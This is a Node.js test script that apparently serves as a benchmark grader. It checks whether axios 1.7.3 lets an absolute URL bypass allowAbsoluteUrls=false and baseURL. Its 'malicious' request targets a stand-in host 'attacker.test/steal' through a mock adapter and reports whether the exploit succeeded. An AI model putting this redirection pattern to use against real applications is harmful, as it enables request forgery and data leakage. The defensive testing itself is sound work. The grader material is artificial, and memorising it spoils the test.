const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    const markerDir = path.join(os.tmpdir(), `oracle-axios-allowabsolute-${process.pid}-${Date.now()}`);
    fs.mkdirSync(markerDir, { recursive: true });
    const markerFile = path.join(markerDir, 'marker.txt');
    fs.writeFileSync(markerFile, 'oracle');

    let operation_completed = false;

    // Benign: relative URL with allowAbsoluteUrls=false should still work and combine with baseURL.
    let benignFinalUrl = '';
    try {
      const benignResp = await axios.get('users?id=1', {
        baseURL: 'http://example.test/api/',
        allowAbsoluteUrls: false,
        adapter: async (config) => {
          benignFinalUrl = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });

      if (!benignResp || benignResp.status !== 200) {
        throw new Error('benign_bad_status');
      }
    } catch (e) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign_exception:' + String((e && e.message) || e)
      }));
      return;
    }

    operation_completed = true;

    // Malicious: absolute attacker URL with allowAbsoluteUrls=false.
    let maliciousFinalUrl = '';
    let maliciousThrew = false;
    let adapterCalled = false;

    try {
      await axios.get('http://attacker.test/steal?x=1', {
        baseURL: 'http://example.test/api/',
        allowAbsoluteUrls: false,
        adapter: async (config) => {
          adapterCalled = true;
          maliciousFinalUrl = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });
    } catch (e) {
      maliciousThrew = true;
      maliciousFinalUrl = 'threw:' + String((e && e.message) || e);
    }

    // Vulnerable behavior (1.7.3): absolute attacker URL is preserved in config.url.
    // Fixed behavior: URL should no longer remain attacker-absolute when allowAbsoluteUrls=false
    // (either rejected/throws, or rewritten as baseURL + provided string).
    const attackerAbsolute = /^https?:\/\/attacker\.test(?::\d+)?(?:\/|$)/i.test(maliciousFinalUrl);
    const exploit_succeeded = adapterCalled && !maliciousThrew && attackerAbsolute;

    const evidence = [
      'benign_final_url=' + benignFinalUrl,
      'malicious_final_url=' + maliciousFinalUrl,
      'adapter_called=' + String(adapterCalled),
      'malicious_threw=' + String(maliciousThrew),
      'attacker_absolute=' + String(attackerAbsolute),
      'marker=' + markerFile
    ].join(';');

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_exception:' + String((e && e.message) || e)
    }));
  }
})();
